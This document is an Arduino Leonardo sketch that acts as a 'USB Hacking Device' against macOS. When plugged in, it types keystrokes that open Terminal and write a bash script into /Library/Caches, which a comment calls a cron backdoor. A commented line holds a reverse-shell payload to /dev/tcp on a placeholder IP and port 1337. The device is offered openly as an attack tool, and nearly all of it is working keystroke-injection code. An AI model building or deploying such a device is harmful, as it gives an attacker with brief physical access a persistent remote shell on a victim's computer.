// OSX USB Hacking Device to use with an Arduino Leonardo Board
// By Angel Diaz (https://twitter.com/angeldiazibarra)

// Adapted for Spanish keyboard layout

#define LED_PIN 13
#define KEY_LEFT_CTRL     0x80
#define KEY_LEFT_SHIFT    0x81
#define KEY_LEFT_ALT      0x82
#define KEY_LEFT_GUI      0x83
#define KEY_RIGHT_CTRL    0x84
#define KEY_RIGHT_SHIFT   0x85
#define KEY_RIGHT_ALT     0x86
#define KEY_RIGHT_GUI     0x87

void setup()
{
  // wait a little to connect up
  delay(500);

  Keyboard.begin();
 
  // allow controlling LED
  pinMode(LED_PIN, OUTPUT);

  // turn the LED on while we're pwning
  digitalWrite(LED_PIN, HIGH);

  // now open Terminal and open new Terminal tab
  openapp("termi");
  
  // Create a cron which opens a backdoor

  // typeln("rm /Library/Caches/cron.sh");
  Keyboard.print("rm "); shift(55);
  Keyboard.print("Library"); shift(55);
  Keyboard.print("Caches"); shift(55);
  typeln("cron.sh");

  // typeln("vi /Library/Caches/cron.sh");
  Keyboard.print("vi "); shift(55);
  Keyboard.print("Library"); shift(55);
  Keyboard.print("Caches"); shift(55);
  typeln("cron.sh");
  
  Keyboard.print("i");
  
  // typeln("#!/bin/bash");
  alt(51); shift(49); shift(55);
  Keyboard.print("bin"); shift(55);
  typeln("bash");
  
  // typeln("bash -i >& /dev/tcp/XXX.XX.XX.XX/1337 0>&1");
  
  // Write and save
  Keyboard.press(KEY_ESC);
  Keyboard.press(KEY_ESC);
  shift(46); typeln("w"); // typeln(":w");
  shift(46); typeln("q"); // typeln(":q");

  // Close terminal window
  cmd(113); // cmd + q
}

void shift(int key){
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(key);
  Keyboard.releaseAll();
}

void alt(int key){
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(key);
  Keyboard.releaseAll();
}

void cmd(int key){
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(key);
  Keyboard.releaseAll();
}

void openapp(String app){
  // CMD + Space to open Spotlight
  cmd(32);
  
  // wait for new window to open:
  delay(50);
    
  typeln(app);
  
  delay(250);
}


// type a string (pressing enter at the end)
// you can add extra delays so you can see what's happening
// by uncommenting the delays
void typeln(String chars)
{
  Keyboard.print(chars);
  delay(100);
  Keyboard.write(176);
  delay(200);
}

void loop()
{
  // blink quickly so we know we're done
  digitalWrite(LED_PIN, HIGH);
  delay(250);
  digitalWrite(LED_PIN, LOW);
  delay(250);
}
